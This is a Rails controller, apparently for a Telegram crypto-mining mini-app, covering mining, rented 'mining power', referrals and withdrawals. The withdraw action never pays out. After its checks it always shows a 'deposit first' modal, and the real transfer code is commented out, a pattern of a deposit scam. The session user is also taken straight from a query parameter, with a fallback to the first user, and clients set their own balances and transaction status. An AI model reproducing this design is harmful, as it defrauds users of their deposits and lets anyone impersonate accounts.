class WebhookController < ApplicationController
  skip_before_action :verify_authenticity_token, only: %i[ telegram  ]

  helper_method :current_user
  helper_method :current_user_id
  helper_method :current_user_mining_started?

  before_action :authorize_user, only: :home

  def home
  end

  def start_mining
    if user_logged_in?
      current_user.update mining_started: Time.zone.now
      redirect_to root_path
    end
  end

  def missions
  end

  def kyc
  end

  def friends
    @invite_link = "https://t.me/tonix_dapp_bot?start=#{current_user_id}"
  end

  def wallet
  end

  def more
    @languages = [
      { code: "en", name: "English" },
      { code: "ru", name: "Русский" }
    ]
  end

  def boost
  end

  def awaiting_payment
    @price = params[:price]&.to_i || 10
    @mining_power = 10 * @price
    @rent_period = 30
    @total_profit = 2.5378 * @price
    @daily_profit = 0.0849 * @price
  end

  def claim
  end

  def contact_support
  end

  def add_content_and_earn
    @rewards = [
      { from: "100", to: "999", delta: "10K" },
      { from: "1K", to: "4.9K", delta: "25K" },
      { from: "5K", to: "9.9K", delta: "50K" },
      { from: "10K", to: "49.9K", delta: "100K" },
      { from: "50K", to: "99.9K", delta: "500K" },
      { from: "100K", to: "499.9K", delta: "1M" },
      { from: "500K", to: "999.9K", delta: "5K" },
      { from: "1M", to: nil, delta: "10M" }
    ]
  end

  def legal_information
  end

  def friends_list
  end

  def language
    @languages = [
      { code: "en", flag: "🇺🇸", name: "English" },
      { code: "ru", flag: "🇷🇺", name: "Русский" }
    ]
  end

  def withdraw
  end

  def deposit_first
  end

  def create_withdraw
    assembly = create_withdraw_params[:assembly]
    amount = create_withdraw_params[:amount].to_f
    # address = create_withdraw_params[:address]

    if assembly == "ton" && amount < 0.35 ||
        assembly == "tonix" && amount < 150_000 ||
        current_user.send(assembly) < amount
      flash.now[:alert] = t("errors.withdraw.msg")
      render turbo_stream: turbo_stream.update(
        "toast-frame",
        partial: "webhook/toast",
        locals: { message: flash[:alert], type: :alert }
      )
    else
      render turbo_stream: turbo_stream.replace("modal", partial: "deposit_first")

      # tx = Transaction.new(
      #   user_id: current_user.id,
      #   tx_type: :outgoing,
      #   sender: "your_account",
      #   receiver: address,
      #   assembly: assembly,
      #   amount: amount,
      #   status: :success
      # )

      # if tx.save
      #   flash.now[:notice] = t("notices.withdraw.msg")
      #   render turbo_stream: turbo_stream.update(
      #     "toast-frame",
      #     partial: "webhook/toast",
      #     locals: { message: flash[:notice], type: :success }
      #   )
      # else
      #   flash.now[:alert] = t("errors.withdraw.msg2")
      #   render turbo_stream: turbo_stream.update(
      #     "toast-frame",
      #     partial: "webhook/toast",
      #     locals: { message: flash[:alert], type: :alert }
      #   )
      # end
    end
  end

  def friends_learn_more
  end

  def push_mining_amount
    if user_logged_in? && current_user_mining_started?
      amount = mining_amount_params
      current_amount = current_user.mining
      if amount > current_amount
        current_user.update mining: amount
      end
    end
  end

  def privacy_policy
  end

  def acceptable_use_policy
  end

  def gdpr_compliance_statement
  end

  def get_mining_amount
    render json: { amount: (user_logged_in? ? current_user.mining : 0.0) }
  end

  def push_native_tx
    unless Transaction.where(tx_hash: push_native_tx_params[:tx_hash]).exists?
      transaction = Transaction.new(push_native_tx_params) do |tx|
        tx.user_id = current_user.id
      end

      if transaction.save
        render json: { msg: t("notice.push_native_tx.msg") }
      else
        render json: { msg: t("errors.push_native_tx.msg") }, status: :unprocessable_entity
      end
    end
  end

  def claim_create
    @min_claim_amount = 0.000001# 0.015

    if current_user.mining < @min_claim_amount
      render(
        json: { msg: t("errors.claim.too_small") },
        status: :unprocessable_entity
      )
    else
      current_user.claim
      render(
        json: { msg: t("notices.claim.msg") }
      )
    end
  end

  def terms_and_conditions
  end

  def contest_create
    contest = Contest.new contest_params

    if contest.save
      flash.now[:notice] = t("notices.contest.msg")
      render turbo_stream: turbo_stream.update(
        "toast-frame",
        partial: "webhook/toast",
        locals: { message: flash[:notice], type: :success }
      )
    else
      flash.now[:alert] = t("errors.contest.msg")
      render turbo_stream: turbo_stream.update(
        "toast-frame",
        partial: "webhook/toast",
        locals: { message: flash[:alert], type: :alert }
      )
    end
  end

  def telegram
    # Parse the incoming request
    data = params.to_unsafe_h

    # Process the incoming message
    if data["message"]
      chat_id = data["message"]["chat"]["id"]
      text = data["message"]["text"]

      # Respond to the user
      bot = Telegram::Bot::Client.new(Rails.application.credentials.telegram[:bot_token])
      bot.api.send_message(chat_id: chat_id, text: "You said: #{text}")
    end

    render json: { status: "ok" }, status: :ok
  end

  private

  def push_native_tx_params
    params.require(:transaction).permit(
        :tx_type,
        :sender,
        :receiver,
        :assembly,
        :amount,
        :status,
        :tx_hash
      )
  end

  def mining_amount_params
    params.require(:amount)
  end

  def create_withdraw_params
    params.require(:withdraw).permit(:assembly, :amount, :address)
  end

  def contest_params
    params.require(:contest).permit(:url).merge(user_id: current_user.id)
  end

  def authorize_user
    user_id = params[:user_id]
    if user_id.present?
      session[:user_id] = user_id.to_i
    end
  end

  def current_user
    User.find_by(telegram_id: session[:user_id]) || User.first
  end

  def current_user_mining_started?
    current_user&.mining_started.present?
  end

  def user_logged_in?
    current_user.present?
  end

  def current_user_id
    current_user.telegram_id if user_logged_in?
  end
end
